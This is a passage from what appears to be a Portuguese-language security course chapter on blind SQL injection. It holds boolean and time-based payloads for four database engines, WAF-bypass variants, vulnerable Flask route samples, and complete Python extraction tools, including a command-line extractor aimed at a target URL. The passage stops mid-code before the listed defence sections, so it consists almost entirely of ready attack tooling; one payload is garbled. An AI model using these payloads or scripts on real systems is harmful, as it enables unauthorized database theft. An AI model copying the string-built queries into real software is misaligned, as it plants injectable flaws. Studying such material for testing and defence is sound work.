---
layout: default
title: "06-blind-sqli"
---

# Capitulo 6: Blind SQL Injection em Detalhe

## Sumario

- [6.1 Boolean-Based Blind: Como Funciona](#61-boolean-based-blind-como-funciona)
- [6.2 Payloads para Boolean-Based Blind](#62-payloads-para-boolean-based-blind)
- [6.3 Time-Based Blind: SLEEP, BENCHMARK, WAITFOR](#63-time-based-blind-sleep-benchmark-waitfor)
- [6.4 Conditional Responses](#64-conditional-responses)
- [6.5 Blind Injection via Cookies](#65-blind-injection-via-cookies)
- [6.6 Blind Injection via HTTP Headers](#66-blind-injection-via-http-headers)
- [6.7 Automacao de Blind Injection](#67-automacao-de-blind-injection)
- [6.8 Binary Search para Extracao](#68-binary-search-para-extracao)
- [6.9 Comparacao de Tecnicas](#69-comparacao-de-tecnicas)
- [6.10 Exemplo Completo de Ataque Blind](#610-exemplo-completo-de-ataque-blind)
- [6.11 Defesas Especificas para Blind Injection](#611-defesas-especificas-para-blind-injection)
- [6.12 Estudo de Casos Reais](#612-estudo-de-casos-reais)

---

## 6.1 Boolean-Based Blind: Como Funciona

### Principio Fundamental

Boolean-based blind SQL injection e uma tecnica onde o atacante infere informacoes do banco de dados observando diferencas comportamentais na aplicacao, sem receber dados ou erros diretamente. O mecanismo baseia-se em consultas condicionais que retornam verdadeiro ou falso, onde cada resposta indica algo sobre os dados being exfiltrados.

Diferente da SQL injection classica (in-band), onde o atacante ve os dados diretamente na resposta, ou da error-based, onde erros revelam informacoes, a blind injection opera em um modelo de inferencia pura. O atacante formula hipoteses sobre os dados e verifica cada hipotese observando se a aplicacao se comporta de forma diferente.

### Mecanismo de Funcionamento

```
+------------------+          +-------------------+          +------------------+
|                  |  HTTP    |                   |   SQL    |                  |
|  Atacante        | -------> |  Aplicacao Web    | -------> |  Banco de Dados  |
|                  |          |  (sem erros)      |          |                  |
|                  | <------- |                   | <------- |                  |
+------------------+  Resposta+-------------------+  Resultado+------------------+
         |                          |
         | Observa diferenca        | Retorna TRUE ou FALSE
         | na resposta              | (sem dados diretamente)
         v
    Resposta A (verdadeiro)
    Resposta B (falso)
```

### Diferenca entre Respostas

O atacante precisa identificar um indicador claro que diferencia resposta verdadeira de falsa. Os indicadores mais comuns sao:

**Tamanho da pagina**: Paginas com resultados tendem a ser maiores.

```http
# Resposta VERDADEIRA (produto encontrado)
HTTP/1.1 200 OK
Content-Length: 15432
{"products": [{"id": 1, "name": "Laptop"}]}

# Resposta FALSA (produto nao encontrado)
HTTP/1.1 200 OK
Content-Length: 234
{"products": []}
```

**Status HTTP**: Algumas aplicacoes retornam status diferente.

```http
# Resposta VERDADEIRA
HTTP/1.1 200 OK

# Resposta FALSA
HTTP/1.1 404 Not Found
```

**Conteudo da pagina**: Texto ou elementos visuais diferem.

```html
<!-- Resposta VERDADEIRA -->
<div class="product">Laptop - $999</div>
<p class="available">In Stock</p>

<!-- Resposta FALSA -->
<div class="not-found">Product not found</div>
```

**Tempo de resposta**: Embora mais associado a time-based, a latencia pode variar.

**Headers de resposta**: Headers customizados podem indicar resultado.

```http
# Resposta VERDADEIRA
X-Result: found

# Resposta FALSA
X-Result: not-found
```

### Fluxo de Extracao

A extracao via blind SQL injection segue um processo sistematico:

**Fase 1: Confirmacao da vulnerabilidade**

```sql
-- Testar se a injecao afeta o resultado
' AND 1=1--     (resposta A)
' AND 1=2--     (resposta B)
-- Se as respostas diferem, a injecao e possivel
```

**Fase 2: Determinar comprimento do dado**

```sql
-- Determinar comprimento do nome do banco de dados
' AND LENGTH(database())=1--    (resposta B -> falso)
' AND LENGTH(database())=5--    (resposta B -> falso)
' AND LENGTH(database())=12--   (resposta A -> verdadeiro)
-- Nome do banco tem 12 caracteres
```

**Fase 3: Extrair caractere por caractere**

```sql
-- Extrair primeiro caractere
' AND ASCII(SUBSTRING(database(),1,1))=97--   (resposta B -> 'a' = 97? Nao)
' AND ASCII(SUBSTRING(database(),1,1))=112--  (resposta A -> 'p' = 112? Sim)
-- Primeiro caractere e 'p'
```

**Fase 4: Repetir para cada caractere**

Continuar ate completar a extracao de todos os caracteres do dado desejado.

### Velocidade de Extracao

A velocidade depende de varios fatores:

- **Tamanho do dado**: Cada caractere requer multiplas requisicoes
- **Metodo de busca**: Sequencial (~95 requisicoes/char) vs binaria (~7 requisicoes/char)
- **Latencia da rede**: Cada requisicao tem overhead de rede
- **Rate limiting**: A aplicacao pode limitar requisicoes

Em media, para extrair uma string de 20 caracteres usando busca binaria:
- 20 caracteres x 7 requisicoes = 140 requisicoes
- Com latencia de 100ms: 14 segundos
- Com latencia de 500ms: 70 segundos

---

## 6.2 Payloads para Boolean-Based Blind

### Payloads Basicos

**Confirmacao de injecao:**

```sql
' AND 1=1--     (verdadeiro)
' AND 1=2--     (falso)
' OR '1'='1     (verdadeiro)
' OR '1'='2     (falso)
```

**Verificacao de tabela existente:**

```sql
' AND (SELECT COUNT(*) FROM users)>0--     (verdadeiro se tabela existe)
' AND (SELECT COUNT(*) FROM users)>1000--   (verdadeiro se tem mais de 1000 linhas)
```

**Extracao de comprimento:**

```sql
' AND LENGTH(database())=1--
' AND LENGTH(database())=2--
-- ... ate encontrar o comprimento correto
```

**Extracao de caractere:**

```sql
' AND ASCII(SUBSTRING(database(),1,1))=97--    (verdadeiro se 'a')
' AND ASCII(SUBSTRING(database(),1,1))=98--    (verdadeiro se 'b')
-- ... ate encontrar o caractere correto
```

### Payloads para Diferentes SGBDs

**MySQL:**

```sql
-- Versao do MySQL
' AND LENGTH(version())=5--
' AND ASCII(SUBSTRING(version(),1,1))=53--    (5 = '5')

-- Database atual
' AND LENGTH(database())=12--
' AND ASCII(SUBSTRING(database(),1,1))=112--   (112 = 'p')

-- Tabela especifica
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=5--
```

**PostgreSQL:**

```sql
-- Versao do PostgreSQL
' AND LENGTH(version())=12--
' AND ASCII(SUBSTRING(version() FROM 1 FOR 1))=80--   (80 = 'P')

-- Database atual
' AND LENGTH(current_database())=12--
' AND ASCII(SUBSTRING(current_database() FROM 1 FOR 1))=112--   (112 = 'p')

-- Tabelas publicas
' AND (SELECT COUNT(*) FROM pg_tables WHERE schemaname='public')=5--
```

**SQL Server:**

```sql
-- Versao do SQL Server
' AND LEN(@@version)=50--
' AND ASCII(SUBSTRING(@@version,1,1))=77--    (77 = 'M')

-- Database atual
' AND LEN(DB_NAME())=12--
' AND ASCII(SUBSTRING(DB_NAME(),1,1))=112--   (112 = 'p')

-- Tabelas
' AND (SELECT COUNT(*) FROM sys.tables WHERE is_ms_shipped=0)=5--
```

**Oracle:**

```sql
-- Versao do Oracle
' AND LENGTH((SELECT banner FROM v$version WHERE ROWNUM=1))=50--
' AND ASCII(SUBSTR((SELECT banner FROM v$version WHERE ROWNUM=1),1,1))=79--  (79 = 'O')

-- Schema atual
' AND LENGTH(SYS.LOGIN_USER)=12--
' AND ASCII(SUBSTR(SYS.LOGIN_USER,1,1))=83--   (83 = 'S')
```

### Payloads Avancados

**Extracao condicional com CASE:**

```sql
-- Extrair dados usando CASE WHEN
' AND (SELECT CASE WHEN (SELECT SUBSTRING(database(),1,1))='p' THEN 1 ELSE 0 END)=1--
-- Mais expressivo que ASCII() para verificacao direta
```

**Extracao com SUBSTRING e LIMIT:**

```sql
-- Primeiro caractere da primeira tabela
' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))=117--  (117 = 'u')

-- Segundo caractere da primeira tabela
' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),2,1))=115--  (115 = 's')

-- Resultado: "us" -> "users"
```

**Extracao com GROUP_CONCAT:**

```sql
-- Extrair multiplas linhas concatenadas
' AND LENGTH(GROUP_CONCAT(table_name))>50--
' AND ASCII(SUBSTRING(GROUP_CONCAT(table_name),1,1))=117--
```

**Extracao com IFNULL:**

```sql
-- Tratar NULLs
' AND IFNULL(LENGTH(database()),0)=12--
```

**Extracao com COALESCE:**

```sql
-- PostgreSQL: tratar NULLs
' AND COALESCE(LENGTH(current_database()),0)=12--
```

### Payloads de bypass de WAF

```sql
-- Case variation
' AnD 1=1--
' aNd LeNgTh(ATABASE())=12--

-- Comentarios inline
' /*!50000and*/ 1=1--
' a/**/nd 1=1--

-- Espacos alternativos
' AND%201=1--
' AND	1=1--
' AND
1=1--

-- Encoding
%27%20AND%201%3D1--
```

---

## 6.3 Time-Based Blind: SLEEP, BENCHMARK, WAITFOR

### Principio

Time-based blind injection e uma variacao da blind injection onde o atacante infere informacoes medindo o tempo que a query leva para executar. Quando a condicao e verdadeira, o banco de dados e forçado a aguardar antes de retornar, criando um atraso observavel.

### Funcoes de Temporizacao por SGBD

**MySQL:**

```sql
-- SLEEP(): pausa por N segundos
' AND IF(LENGTH(database())=12, SLEEP(5), 0)--
-- Se o comprimento for 12, espera 5 segundos

-- SLEEP() com valor variavel
' AND IF(ASCII(SUBSTRING(database(),1,1))=112, SLEEP(3), 0)--

-- BENCHMARK(): executa operacao N vezes
' AND IF(LENGTH(database())=12, BENCHMARK(5000000, SHA1('test')), 0)--
-- SHA1 executado 5 milhoes de vezes causa atraso significativo
```

**PostgreSQL:**

```sql
-- pg_sleep(): pausa por N segundos
' AND CASE WHEN LENGTH(current_database())=12 THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- Alternativa: usar generate_series para causar carga
' AND CASE WHEN LENGTH(current_database())=12 THEN (SELECT pg_sleep(5)) ELSE '0' END--

-- PostgreSQL 9.6+: pg_sleep com precisao
' AND CASE WHEN LENGTH(current_database())=12 THEN pg_sleep(0.5) ELSE pg_sleep(0) END--
```

**SQL Server:**

```sql
-- WAITFOR DELAY: pausa por tempo especifico
' ; IF LENGTH(DB_NAME())=12 WAITFOR DELAY '0:0:5'--

-- WAITFOR com formato HH:MM:SS
' ; IF (1=1) BEGIN WAITFOR DELAY '0:0:5' END--

-- SQL Server: medir tempo com DATEDIFF
' ; DECLARE @start DATETIME=GETDATE(); IF LENGTH(DB_NAME())=12 WAITFOR DELAY '0:0:5'; IF DATEDIFF(SECOND,@start,GETDATE())>=5 PRINT 'true'--
```

**Oracle:**

```sql
-- DBMS_PIPE.RECEIVE_MESSAGE: pausa por N segundos
' AND CASE WHEN LENGTH(SYS.LOGIN_USER)=12 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 0 END FROM dual--

-- DBMS_LOCK.SLEEP: pausa por N segundos
' AND CASE WHEN LENGTH(SYS.LOGIN_USER)=12 THEN (SELECT DBMS_LOCK.SLEEP(5) FROM dual) ELSE 0 END FROM dual--
```

### Metodologia de Extracao

```sql
-- Determinar comprimento do nome do banco de dados
' AND IF(LENGTH(database())=1, SLEEP(5), 0)--
-- Medir tempo: se >= 5 segundos, comprimento e 1

' AND IF(LENGTH(database())=2, SLEEP(5), 0)--
-- Medir tempo: se >= 5 segundos, comprimento e 2

-- Continuar ate encontrar o comprimento correto

-- Extrair caractere por caractere
' AND IF(ASCII(SUBSTRING(database(),1,1))=97, SLEEP(5), 0)--
-- Se >= 5 segundos: primeiro caractere e 'a' (97)

' AND IF(ASCII(SUBSTRING(database(),1,1))=98, SLEEP(5), 0)--
-- Se >= 5 segundos: primeiro caractere e 'b' (98)

-- Continuar ate encontrar o caractere correto
```

### Calculo de Timeout

O timeout ideal depende de varios fatores:

```python
import requests
import time

def measure_baseline(url, iterations=10):
    """Medir latencia baseline da requisicao."""
    times = []
    for _ in range(iterations):
        start = time.time()
        requests.get(url)
        elapsed = time.time() - start
        times.append(elapsed)
    
    avg_latency = sum(times) / len(times)
    return avg_latency

def calculate_timeout(url, base_sleep=5):
    """Calcular timeout ideal baseado na latencia."""
    baseline = measure_baseline(url)
    # Timeout deve ser significativamente maior que baseline
    timeout = max(base_sleep, baseline * 3)
    return timeout
```

### Time-Based Injection Avancado

**Multiplos Sleeps:**

```sql
-- Extrair 3 caracteres em uma requisicao (MySQL)
' AND IF(
  ASCII(SUBSTRING(database(),1,1))=112 AND
  ASCII(SUBSTRING(database(),2,1))=114 AND
  ASCII(SUBSTRING(database(),3,1))=111,
  SLEEP(5), 0)--
-- Atraso apenas se TODOS os 3 caracteres estiverem corretos
```

**Temporizacao adaptativa:**

```python
def adaptive_time_based_extract(url, query, base_sleep=3):
    """Extracao time-based com timeout adaptativo."""
    
    # Medir latencia base
    baseline = measure_baseline(url)
    timeout = max(base_sleep, baseline * 3)
    
    result = ""
    
    # Determinar comprimento
    for length in range(1, 100):
        payload = f"' AND IF(LENGTH({query})={length}, SLEEP({timeout}), 0)--"
        start = time.time()
        requests.get(url, params={"id": f"1 {payload}"})
        elapsed = time.time() - start
        
        if elapsed >= timeout * 0.9:
            print(f"Length: {length}")
            break
    
    # Extrair caracteres
    for i in range(1, length + 1):
        for char in range(32, 127):
            payload = (
                f"' AND IF(ASCII(SUBSTRING({query},{i},1))={char}, "
                f"SLEEP({timeout}), 0)--"
            )
            start = time.time()
            requests.get(url, params={"id": f"1 {payload}"})
            elapsed = time.time() - start
            
            if elapsed >= timeout * 0.9:
                result += chr(char)
                print(f"Position {i}: {chr(char)} -> {result}")
                break
    
    return result
```

### Time-Based Injection com Diferentes Tecnicas

**SLEEP vs BENCHMARK (MySQL):**

```sql
-- SLEEP: mais previsivel, pausa por tempo exato
' AND IF(1=1, SLEEP(5), 0)--

-- BENCHMARK: menos previsivel, causa carga CPU
' AND IF(1=1, BENCHMARK(10000000, SHA1('test')), 0)--

-- Vantagem do BENCHMARK: pode ser mais rapido que SLEEP
-- Desvantagem: menos consistente em ambientes com carga variavel
```

**WAITFOR DELAY vs pg_sleep:**

```sql
-- SQL Server: WAITFOR DELAY mais preciso
' ; IF (1=1) WAITFOR DELAY '0:0:5'--

-- PostgreSQL: pg_sleep com precisao de milissegundos
' AND CASE WHEN (1=1) THEN pg_sleep(0.5) ELSE pg_sleep(0) END--
```

---

## 6.4 Conditional Responses

### Conceito

Conditional responses sao o mecanismo fundamental da boolean-based blind injection. A aplicacao retorna respostas diferentes baseadas no resultado da query SQL injetada. O atacante observa essas diferencas para inferir informacoes.

### Tipos de Condicionais

**Resposta condicional no conteudo:**

```html
<!-- Resposta VERDADEIRA (produto encontrado) -->
<div class="product-details">
    <h1>Laptop</h1>
    <p class="price">$999</p>
    <p class="stock">In Stock</p>
</div>

<!-- Resposta FALSA (produto nao encontrado) -->
<div class="error">
    <h1>Product Not Found</h1>
    <p>The requested product does not exist.</p>
</div>
```

**Resposta condicional no status HTTP:**

```http
# Resposta VERDADEIRA
HTTP/1.1 200 OK
Content-Type: application/json
{"found": true, "product": {...}}

# Resposta FALSA
HTTP/1.1 404 Not Found
Content-Type: application/json
{"found": false, "error": "Product not found"}
```

**Resposta condicional em headers:**

```http
# Resposta VERDADEIRA
HTTP/1.1 200 OK
X-Product-Found: true
X-Result-Count: 1

# Resposta FALSA
HTTP/1.1 200 OK
X-Product-Found: false
X-Result-Count: 0
```

### Identificando Condicionais

Para identificar qual tipo de condicional a aplicacao usa:

```python
import requests

def identify_conditional_indicator(url):
    """Identificar qual indicador differencia respostas verdadeiras e falsas."""
    
    # Requisicao verdadeira
    resp_true = requests.get(url, params={"id": "1 AND 1=1--"})
    
    # Requisicao falsa
    resp_false = requests.get(url, params={"id": "1 AND 1=2--"})
    
    indicators = {}
    
    # Verificar tamanho
    indicators['content_length'] = len(resp_true.text) != len(resp_false.text)
    
    # Verificar status
    indicators['status_code'] = resp_true.status_code != resp_false.status_code
    
    # Verificar headers especificos
    for header in resp_true.headers:
        if header in resp_false.headers:
            indicators[f'header_{header}'] = resp_true.headers[header] != resp_false.headers[header]
    
    # Verificar substring no conteudo
    indicators['substring'] = resp_true.text != resp_false.text
    
    return indicators
```

### Automatizacao de Deteccao

```python
import requests
import re

class BooleanDetector:
    def __init__(self, url):
        self.url = url
        self.true_response = None
        self.false_response = None
    
    def calibrate(self, true_payload, false_payload):
        """Calibrar respostas verdadeiras e falsas."""
        self.true_response = requests.get(self.url, params={"id": true_payload})
        self.false_response = requests.get(self.url, params={"id": false_payload})
    
    def is_true(self, test_payload):
        """Verificar se uma resposta indica verdadeiro."""
        response = requests.get(self.url, params={"id": test_payload})
        
        # Comparar com respostas calibradas
        if response.text == self.true_response.text:
            return True
        elif response.text == self.false_response.text:
            return False
        
        # Analise avancada
        # Verificar tamanho
        if abs(len(response.text) - len(self.true_response.text)) < 10:
            return True
        
        return None
    
    def detect_indicator(self):
        """Detectar automaticamente o indicador de verdadeiro/falso."""
        # Calibrar
        self.calibrate("1 AND 1=1--", "1 AND 1=2--")
        
        # Analisar diferencas
        true_len = len(self.true_response.text)
        false_len = len(self.false_response.text)
        
        if true_len != false_len:
            print(f"[+] Content length indicator: true={true_len}, false={false_len}")
            return 'content_length'
        
        if self.true_response.status_code != self.false_response.status_code:
            print(f"[+] Status code indicator: true={self.true_response.status_code}, false={self.false_response.status_code}")
            return 'status_code'
        
        # Verificar substring
        if "Product" in self.true_response.text and "Not Found" in self.false_response.text:
            print("[+] Substring indicator found")
            return 'substring'
        
        print("[-] No clear indicator found")
        return None
```

---

## 6.5 Blind Injection via Cookies

### Vetor de Ataque

Cookies frequentemente sao incorporados a queries sem sanitizacao adequada. O atacante pode injetar payloads em cookies e observar diferencas na resposta.

### Cenarios de Ataque

**Cookie de sessao:**

```python
# Aplicacao vulneravel que usa cookie de sessao em query
@app.route('/dashboard')
def dashboard():
    session_id = request.cookies.get('session_id')
    # VULNERAVEL
    conn = get_db()
    user = conn.execute(
        f"SELECT * FROM sessions WHERE session_id = '{session_id}'"
    ).fetchone()
    return render_template('dashboard.html', user=user)
```

**Cookie de usuario:**

```python
# Aplicacao que usa cookie de preferencia
@app.route('/products')
def products():
    sort_by = request.cookies.get('sort', 'name')
    # VULNERAVEL
    conn = get_db()
    items = conn.execute(
        f"SELECT * FROM products ORDER BY {sort_by}"
    ).fetchall()
    return render_template('products.html', items=items)
```

### Payloads em Cookies

```sql
-- SQLi em cookie de sessao
Cookie: session_id=abc' OR 1=1--

-- SQLi em cookie de preferencia
Cookie: sort=name' OR 1=1--

-- Blind injection em cookie
Cookie: session_id=abc' AND LENGTH(database())=12--
Cookie: session_id=abc' AND ASCII(SUBSTRING(database(),1,1))=112--
```

### Extracao via Cookies

```python
import requests
import time

def blind_sqli_via_cookie(url, cookie_name, cookie_value_prefix):
    """Extrair dados via blind injection em cookie."""
    
    session = requests.Session()
    
    # Calibrar respostas
    true_url = f"{url}?id=1"
    false_url = f"{url}?id=1"
    
    # Cookie verdadeiro
    session.cookies.set(cookie_name, f"{cookie_value_prefix}' AND 1=1--")
    resp_true = session.get(true_url)
    
    # Cookie falso
    session.cookies.set(cookie_name, f"{cookie_value_prefix}' AND 1=2--")
    resp_false = session.get(false_url)
    
    # Extrair dados
    result = ""
    for i in range(1, 50):
        for char in range(32, 127):
            payload = (
                f"{cookie_value_prefix}' AND ASCII(SUBSTRING(database(),{i},1))={char}--"
            )
            session.cookies.set(cookie_name, payload)
            response = session.get(url)
            
            if len(response.text) == len(resp_true.text):
                result += chr(char)
                print(f"Position {i}: {chr(char)} -> {result}")
                break
    
    return result
```

### Blind Injection via Cookie com Tempo

```python
def time_based_via_cookie(url, cookie_name, timeout=5):
    """Extrair dados via time-based injection em cookie."""
    
    session = requests.Session()
    
    for i in range(1, 50):
        for char in range(32, 127):
            payload = (
                f"session' AND IF(ASCII(SUBSTRING(database(),{i},1))={char}, "
                f"SLEEP({timeout}), 0)--"
            )
            session.cookies.set(cookie_name, payload)
            
            start = time.time()
            session.get(url)
            elapsed = time.time() - start
            
            if elapsed >= timeout * 0.9:
                print(f"Position {i}: {chr(char)}")
                break
```

---

## 6.6 Blind Injection via HTTP Headers

### Vetores de Ataque em Headers

Varios headers HTTP podem ser vetores de blind injection:

```http
# User-Agent: frequentemente logado
User-Agent: Mozilla/5.0' AND 1=1--

# X-Forwarded-For: usado para logging de IP
X-Forwarded-For: 127.0.0.1' AND 1=1--

# Referer: pode ser logado ou usado em queries
Referer: http://target.com/page?id=1' AND 1=1--

# Cookie: session, user_id, etc.
Cookie: session=abc' AND 1=1--

# X-Custom-Header: qualquer header customizado
X-Custom-Header: test' AND 1=1--
```

### Cenarios de Ataque

**Blind injection via User-Agent:**

```python
# Aplicacao que loga User-Agent
@app.before_request
def log_user_agent():
    user_agent = request.headers.get('User-Agent', '')
    # VULNERAVEL
    conn = get_db()
    conn.execute(
        f"INSERT INTO access_logs (user_agent) VALUES ('{user_agent}')"
    )
    conn.commit()
```

**Blind injection via X-Forwarded-For:**

```python
@app.before_request
def log_ip():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    # VULNERAVEL
    conn = get_db()
    conn.execute(
        f"INSERT INTO ip_logs (ip_address) VALUES ('{ip}')"
    )
    conn.commit()
```

### Extracao via Headers

```python
def blind_sqli_via_headers(url, header_name):
    """Extrair dados via blind injection em header."""
    
    # Calibrar respostas
    headers_true = {header_name: "test' AND 1=1--"}
    headers_false = {header_name: "test' AND 1=2--"}
    
    resp_true = requests.get(url, headers=headers_true)
    resp_false = requests.get(url, headers=headers_false)
    
    # Extrair dados
    result = ""
    for i in range(1, 50):
        for char in range(32, 127):
            headers = {header_name: f"test' AND ASCII(SUBSTRING(database(),{i},1))={char}--"}
            response = requests.get(url, headers=headers)
            
            if len(response.text) == len(resp_true.text):
                result += chr(char)
                print(f"Position {i}: {chr(char)} -> {result}")
                break
    
    return result
```

---

## 6.7 Automacao de Blind Injection

### Framework de Automacao

```python
import requests
import time
import string
import sys

class BlindSQLiAutomator:
    def __init__(self, url, param_name='id'):
        self.url = url
        self.param_name = param_name
        self.session = requests.Session()
        self.true_response = None
        self.false_response = None
        self.timeout = 5
    
    def calibrate(self):
        """Calibrar respostas verdadeiras e falsas."""
        print("[*] Calibrating responses...")
        
        # Verdadeiro
        params = {self.param_name: "1 AND 1=1--"}
        self.true_response = self.session.get(self.url, params=params)
        
        # Falso
        params = {self.param_name: "1 AND 1=2--"}
        self.false_response = self.session.get(self.url, params=params)
        
        print(f"[+] True response length: {len(self.true_response.text)}")
        print(f"[+] False response length: {len(self.false_response.text)}")
        
        if len(self.true_response.text) == len(self.false_response.text):
            print("[-] WARNING: Content length not differentiating")
            print("[-] Trying status codes...")
            print(f"[+] True status: {self.true_response.status_code}")
            print(f"[+] False status: {self.false_response.status_code}")
    
    def test_injection(self):
        """Testar se a injecao e possivel."""
        print("[*] Testing injection...")
        
        params = {self.param_name: "1 AND 1=1--"}
        resp_true = self.session.get(self.url, params=params)
        
        params = {self.param_name: "1 AND 1=2--"}
        resp_false = self.session.get(self.url, params=params)
        
        if resp_true.text != resp_false.text:
            print("[+] Injection confirmed!")
            return True
        else:
            print("[-] Injection not confirmed")
            return False
    
    def extract_length(self, query):
        """Extrair comprimento de um dado."""
        print(f"[*] Extracting length of: {query}")
        
        for length in range(1, 200):
            payload = f"1 AND LENGTH({query})={length}--"
            params = {self.param_name: payload}
            response = self.session.get(self.url, params=params)
            
            if len(response.text) == len(self.true_response.text):
                print(f"[+] Length: {length}")
                return length
        
        return None
    
    def extract_string(self, query, max_length=100):
        """Extrair string caractere por caractere."""
        print(f"[*] Extracting string: {query}")
        
        # Determinar comprimento
        length = self.extract_length(query)
        if not length:
            return None
        
        result = ""
        for i in range(1, length + 1):
            for char in range(32, 127):
                payload = f"1 AND ASCII(SUBSTRING({query},{i},1))={char}--"
                params = {self.param_name: payload}
                response = self.session.get(self.url, params=params)
                
                if len(response.text) == len(self.true_response.text):
                    result += chr(char)
                    sys.stdout.write(f"\r[+] Progress: {result}")
                    sys.stdout.flush()
                    break
        
        print()
        return result
    
    def extract_binary(self, query, max_length=100):
        """Extrair usando busca binaria (mais rapido)."""
        print(f"[*] Binary extraction: {query}")
        
        # Determinar comprimento
        length = self.extract_length(query)
        if not length:
            return None
        
        result = ""
        for i in range(1, length + 1):
            low, high = 32, 126
            while low <= high:
                mid = (low + high) // 2
                payload = f"1 AND ASCII(SUBSTRING({query},{i},1))>{mid}--"
                params = {self.param_name: payload}
                response = self.session.get(self.url, params=params)
                
                if len(response.text) == len(self.true_response.text):
                    low = mid + 1
                else:
                    high = mid - 1
            
            char = chr(low)
            result += char
            sys.stdout.write(f"\r[+] Progress: {result}")
            sys.stdout.flush()
        
        print()
        return result

# Uso
if __name__ == "__main__":
    automator = BlindSQLiAutomator("http://target.com/products")
    automator.calibrate()
    
    if automator.test_injection():
        # Extrair versao do banco
        version = automator.extract_string("version()")
        print(f"Version: {version}")
        
        # Extrair nome do banco
        database = automator.extract_string("database()")
        print(f"Database: {database}")
        
        # Extrair primeira tabela
        table = automator.extract_string(
            "(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)"
        )
        print(f"First table: {table}")
```

### Script de Extracao Completo

```python
#!/usr/bin/env python3
"""
Blind SQL Injection Extractor
Extrai dados de bancos de dados via blind injection.
Uso apenas em ambiente de teste autorizado.
"""

import requests
import sys
import time
import argparse

class BlindExtractor:
    def __init__(self, url, param, method='GET'):
        self.url = url
        self.param = param
        self.method = method
        self.session = requests.Session()
        self.baseline_len = 0
        self.sleep_time = 3
    
    def set_baseline(self):
        """Definir comprimento baseline."""
        resp_true = self.send_payload("1 AND 1=1--")
        resp_false = self.send_payload("1 AND 1=2--")
        
        self.baseline_len = len(resp_true.text)
        diff = len(resp_false.text)
        
        print(f"[*] Baseline: true={self.baseline_len}, false={diff}")
        
        if self.baseline_len == diff:
            print("[!] Warning: Content length not differentiating")
            print("[*] Using alternative detection method")
    
    def send_payload(self, payload):
        """Enviar payload e retornar resposta."""
        if self.method == 'GET':
            return self.session.get(self.url, params={self.param: payload})
        else:
            return self.session.post(self.url, data={self.param: payload})
    
    def is_true(self, payload):
        """Verificar se payload retorna verdadeiro."""
        resp = self.send_payload(payload)
        return len(resp.text) == self.baseline_len
    
    def get_length(self, query):
        """Obter comprimento de uma query."""
        for length in range(1, 500):
            if self.is_true(f"1 AND LENGTH({query})={length}--"):
                return length
        return None
    
    def get_char(self, query, position):
        """Obter caractere em posicao especifica."""
        for char in range(32, 127):
            if self.is_true(f"1 AND ASCII(SUBSTRING({query},{position},1))={char}--"):
                return chr(char)
        return None
    
    def extract(self, query, max_len=100):
        """Extrair string completa."""
        length = self.get_length(query)
        if not length:
            return None
        
        result = ""
        for i in range(1, min(length, max_len) + 1):
            char = self.get_char(query, i)
            if char:
                result += char
                sys.stdout.write(f"\r[*] {result}")
                sys.stdout.flush()
            else:
                break
        
        print()
        return result

def main():
    parser = argparse.ArgumentParser(description='Blind SQL Injection Extractor')
    parser.add_argument('url', help='Target URL')
    parser.add_argument('param', help='Parameter name')
    parser.add_argument('--method', default='GET', choices=['GET', 'POST'])
    parser.add_argument('--query', help='Query to extract')
    
    args = parser.parse_args()
    
    extractor = BlindExtractor(args.url, args.param, args.method)
    extractor.set_baseline()
    
    if args.query:
        result = extractor.extract(args.query)
        print(f"[+] Result: {result}")
    else:
        # Extrair informacoes basicas
        print("[*] Extracting database version...")
        version = extractor.extract("version()")
        print(f"[+] Version: {version}")
        
        print("[*] Extracting database name...")
        database = extractor.extract("database()")
        print(f"[+] Database: {database}")

if __name__ == "__main__":
    main()
```

---

## 6.8 Binary Search para Extracao

### Principio

Busca binaria reduz significativamente o numero de requisicoes necessarias para extrair dados via blind injection. Em vez de testar cada caractere individualmente (ate 95 requisicoes por caractere), busca binaria testa metade do intervalo, reduzindo para aproximadamente 7 requisicoes por caractere.

### Algoritmo

```python
def binary_search_char(extractor, query, position):
    """Encontrar caractere usando busca binaria."""
    low = 32   # Primeiro caractere imprimivel
    high = 126 # Ultimo caractere imprimivel
    
    while low <= high:
        mid = (low + high) // 2
        
        # Testar se ASCII > mid
        if extractor.is_true(f"1 AND ASCII(SUBSTRING({query},{position},1))>{mid}--"):
            low = mid + 1
        else:
            high = mid - 1
    
    return chr(low)
```

### Complexidade

| Metodo | Requisicoes/char | Requisicoes para 20 chars |
|--------|------------------|---------------------------|
| Sequencial | ~95 | ~1900 |
| Binaria | ~7 | ~140 |
| Otimizada | ~5 | ~100 |

### Otimizacoes

**Cache de resultados:** Armazenar caracteres ja encontrados para evitar requisicoes repetidas.

```python
char_cache = {}

def binary_search_optimized(extractor, query, position):
    """Busca binaria com cache."""
    # Verificar cache
    cache_key = f"{query}:{position}"
    if cache_key in char_cache:
        return char_cache[cache_key]
    
    # Busca binaria
    low = 32
    high = 126
    
    while low <= high:
        mid = (low + high) // 2
        if extractor.is_true(f"1 AND ASCII(SUBSTRING({query},{position},1))>{mid}--"):
            low = mid + 1
        else:
            high = mid - 1
    
    char = chr(low)
    char_cache[cache_key] = char
    return char
```

**Extracao paralela:** Em alguns casos, e possivel extrair multiplos caracteres simultaneamente.

```sql
-- Extrair 4 caracteres em uma requisicao
' AND (
  ASCII(SUBSTRING(database(),1,1)) > 100 AND
  ASCII(SUBSTRING(database(),2,1)) > 100 AND
  ASCII(SUBSTRING(database(),3,1)) > 100 AND
  ASCII(SUBSTRING(database(),4,1)) > 100
)--
```

### Implementacao Completa

```python
class BinaryExtractor:
    def __init__(self, automator):
        self.automator = automator
        self.cache = {}
    
    def extract_char(self, query, position):
        """Extrair caractere usando busca binaria."""
        cache_key = f"{query}:{position}"
        if cache_key in self.cache:
            return self.cache[cache_key]
        
        low, high = 32, 126
        
        while low <= high:
            mid = (low + high) // 2
            payload = f"1 AND ASCII(SUBSTRING({query},{position},1))>{mid}--"
            
            if self.automator.is_true(payload):
                low = mid + 1
            else:
                high = mid - 1
        
        char = chr(low)
        self.cache[cache_key] = char
        return char
    
    def extract_string(self, query, max_length=100):
        """Extrair string completa usando busca binaria."""
        # Determinar comprimento
